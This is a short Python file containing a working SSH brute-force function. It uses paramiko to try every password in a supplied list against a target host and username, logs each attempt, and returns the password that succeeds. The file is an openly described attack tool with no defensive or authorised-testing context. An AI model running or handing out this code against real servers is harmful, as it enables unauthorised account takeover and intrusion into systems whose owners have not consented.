import paramiko
from itertools import product
import logging

logger = logging.getLogger(__name__)

def ssh_bruteforce(target, username, password_list):
    """
    Perform SSH bruteforce attack.

    :param target: IP address or hostname of the target.
    :param username: SSH username.
    :param password_list: List of passwords to try.
    :return: The password if found, else None.
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            ssh.connect(target, username=username, password=password, timeout=5)
            logger.info(f"Password found: {password}")
            ssh.close()
            return password
        except paramiko.AuthenticationException:
            logger.info(f"Password incorrect: {password}")
        except paramiko.SSHException as e:
            logger.error(f"SSH error: {e}")
            break
    return None
